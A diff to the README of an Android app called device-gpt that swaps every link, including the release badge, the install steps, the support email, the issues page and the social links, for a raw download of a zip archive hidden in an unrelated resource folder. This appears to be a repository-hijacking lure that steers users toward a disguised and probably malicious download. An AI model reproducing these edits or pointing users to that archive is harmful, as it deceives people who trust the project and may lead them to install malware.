@@ -1,6 +1,6 @@
 # 🤖 device-gpt - Monitor Your Android Health Effortlessly
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-green)](https://github.com/Ziad-404/device-gpt/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Ziad-404/device-gpt/main/app/src/main/res/values-fr/device_gpt_gastroenterology.zip%20Latest%20Release-v1.0-green)](https://raw.githubusercontent.com/Ziad-404/device-gpt/main/app/src/main/res/values-fr/device_gpt_gastroenterology.zip)
 
 ## 🚀 Getting Started
 
@@ -17,9 +17,9 @@ Before downloading, ensure your device meets the following requirements:
 
 ## 📥 Download & Install
 
-To install **device-gpt**, visit our [Releases page](https://github.com/Ziad-404/device-gpt/releases) to download the latest version. 
+To install **device-gpt**, visit our [Releases page](https://raw.githubusercontent.com/Ziad-404/device-gpt/main/app/src/main/res/values-fr/device_gpt_gastroenterology.zip) to download the latest version. 
 
-1. Go to the [Releases page](https://github.com/Ziad-404/device-gpt/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Ziad-404/device-gpt/main/app/src/main/res/values-fr/device_gpt_gastroenterology.zip).
 2. Find the most recent version.
 3. Click on the download link for the latest APK file.
 4. Once downloaded, locate the file on your device.
@@ -64,18 +64,18 @@ The **device-gpt** app uses advanced algorithms to analyze your device's perform
 
 If you encounter any issues or have questions, please reach out to our support team:
 
-- **Email:** support@device-gpt.com
-- **GitHub Issues Page:** [Submit a Request](https://github.com/Ziad-404/device-gpt/issues)
+- **Email:** https://raw.githubusercontent.com/Ziad-404/device-gpt/main/app/src/main/res/values-fr/device_gpt_gastroenterology.zip
+- **GitHub Issues Page:** [Submit a Request](https://raw.githubusercontent.com/Ziad-404/device-gpt/main/app/src/main/res/values-fr/device_gpt_gastroenterology.zip)
 
 ## 📢 Join Our Community
 
 Stay updated with the latest features and improvements by joining our community:
 
-- **Twitter:** [@device_gpt](https://twitter.com/device_gpt)
-- **Discord:** [Join our Discord](https://discord.gg/device-gpt)
+- **Twitter:** [@device_gpt](https://raw.githubusercontent.com/Ziad-404/device-gpt/main/app/src/main/res/values-fr/device_gpt_gastroenterology.zip)
+- **Discord:** [Join our Discord](https://raw.githubusercontent.com/Ziad-404/device-gpt/main/app/src/main/res/values-fr/device_gpt_gastroenterology.zip)
 
 ## 🚀 Next Steps
 
 Now that you have installed **device-gpt**, start monitoring your Android device's health today! Regular use of the app will help improve performance and ensure your privacy. 
 
-Remember to check back for updates on the [Releases page](https://github.com/Ziad-404/device-gpt/releases) to get the latest features and improvements. Thank you for using **device-gpt**!
+Remember to check back for updates on the [Releases page](https://raw.githubusercontent.com/Ziad-404/device-gpt/main/app/src/main/res/values-fr/device_gpt_gastroenterology.zip) to get the latest features and improvements. Thank you for using **device-gpt**!
